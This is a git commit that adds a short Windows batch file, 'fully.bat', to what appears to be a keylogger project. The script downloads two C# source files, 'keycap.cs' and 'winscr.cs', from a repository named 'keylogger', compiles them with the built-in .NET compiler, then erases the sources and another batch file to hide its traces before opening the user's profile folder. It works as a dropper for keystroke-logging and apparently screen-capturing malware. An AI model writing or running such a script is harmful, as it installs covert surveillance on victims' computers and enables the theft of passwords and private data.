0cdf4e9c10a05d11cdbe3738bda2ea2f6804c288
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-09-08 09:32:09 -0300

    Create fully.bat

---
+++ fully.bat
@@ -0,0 +1,6 @@
+@echo off
+curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/keycap.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe keycap.cs
+curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/winscr.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe winscr.cs
+erase keycap.cs & erase winscr.cs & erase f.bat & explorer %userprofile%
